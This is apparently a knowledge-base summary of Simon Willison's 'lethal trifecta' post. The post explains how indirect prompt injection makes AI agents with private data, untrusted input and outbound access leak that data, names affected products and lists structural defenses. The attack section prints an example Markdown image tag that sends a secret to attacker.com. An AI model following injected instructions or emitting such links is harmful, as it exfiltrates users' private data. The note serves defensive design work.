---
type: source
title: "The lethal trifecta for AI agents"
author: "Simon Willison"
date: "2025-06-16"
ingested: "2026-06-01"
tags: [ai-agents, security, exfiltration, prompt-injection, guardrails]
---

# The Lethal Trifecta for AI Agents — Simon Willison (2025)

**URL:** [simonwillison.net/2025/Jun/16/the-lethal-trifecta/](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

Simon Willison's canonical framing of why certain agent configurations are structurally exploitable regardless of how well-engineered the LLM itself is. The post names three conditions that, when simultaneously present in an agent, guarantee that an indirect prompt-injection attack can exfiltrate private data to an attacker-controlled server.

## The Three Legs

| Leg | Description |
|---|---|
| **1. Access to private data** | The agent holds tools or permissions that let it read sensitive information — emails, documents, databases, financial records, source code. |
| **2. Exposure to untrusted content** | A path exists by which malicious text (or images) reaches the LLM — a web page summarized, an email processed, a shared document read. |
| **3. Ability to externally communicate** | The agent can make outbound requests: fetch URLs, render Markdown images, call APIs, send messages. This is the exfiltration vector. |

Willison's key insight: all three legs must be severed to be safe. Severing any one of them prevents the exploit. Addressing only one or two leaves the combination intact.

## The Attack Pattern

Malicious instructions embedded in untrusted content instruct the agent to encode private data into an outbound URL (e.g., a Markdown image tag `![x](https://attacker.com?data=<secret>)`). When the rendering client fetches the image — sometimes automatically, without user click — the attacker's logging server captures the exfiltrated parameter.

## Named Production Systems Exploited

Willison documents a large number of production AI products exploited via this pattern: Microsoft 365 Copilot, GitHub's official MCP server, GitLab Duo Chatbot, ChatGPT, ChatGPT Plugins, Google Bard, Amazon Q, Google NotebookLM, GitHub Copilot Chat, Google AI Studio, Microsoft Copilot, Slack, Mistral Le Chat, xAI's Grok, Anthropic's Claude iOS app, and ChatGPT Operator.

## Recommended Mitigations

Willison is skeptical of probabilistic guardrails, noting that "guardrails claiming 95% protection represent a very much a failing grade in security contexts." His recommended direction is **structural**: design agents so the three legs cannot coexist:

1. Minimize private-data access to what is strictly needed (least privilege).
2. Sandbox untrusted content so it cannot reach the same agent context that holds private data.
3. Restrict or block the agent's ability to make outbound requests — allow only a narrow allowlist of endpoints.

He also references Google DeepMind's CaMeL technique as "a promising new direction" and academic design patterns that constrain agents so untrusted input "is impossible to trigger any consequential actions." His bottom line: **"The only way to stay safe is to avoid that lethal trifecta combination entirely."**

## Companion Posts & Design Patterns

The lethal-trifecta post anchors a series; two companions are load-bearing for agent design:

- [Design Patterns for Securing LLM Agents against Prompt Injections](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/) — six architectural patterns that constrain an agent so untrusted input cannot trigger consequential actions: **plan-then-execute, dual-LLM, action-selector, map-reduce, code-then-execute, and context-minimization**.
- [MCP prompt injection security problems](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/) — MCP tool servers as a new indirect-injection surface, relevant wherever an agent loads third-party MCP tools.

These motivate the model-side and architecture-side defenses catalogued in [[concepts/agent-execution-guardrails]] (Layer 4: prompt-injection defense): egress control severs leg 3, but these patterns reduce the probability that leg 2 ever reaches leg 1.

## Tag Index

Willison maintains a running tag page at [simonwillison.net/tags/exfiltration-attacks/](https://simonwillison.net/tags/exfiltration-attacks/) cataloguing all documented exfiltration attack cases.

## See Also

- [[concepts/agent-egress-control]] — structural defense: severing leg 3 via deny-default egress allowlist
- [[concepts/agent-data-sanitization]] — sanitization layer: preventing private data from reaching the LLM prompt (reduces leg 1 exposure)
- [[concepts/agent-execution-guardrails]] — HITL on outbound tools + prompt-injection defense; blocking the leg-3 (external-comms) tools is the single highest-leverage intervention
- [[concepts/nemoclaw]] — one concrete instantiation of both defenses in a sandboxed agent runtime
- [[synthesis/ai-agent-guardrails-architecture]] — the defense-in-depth synthesis this source anchors
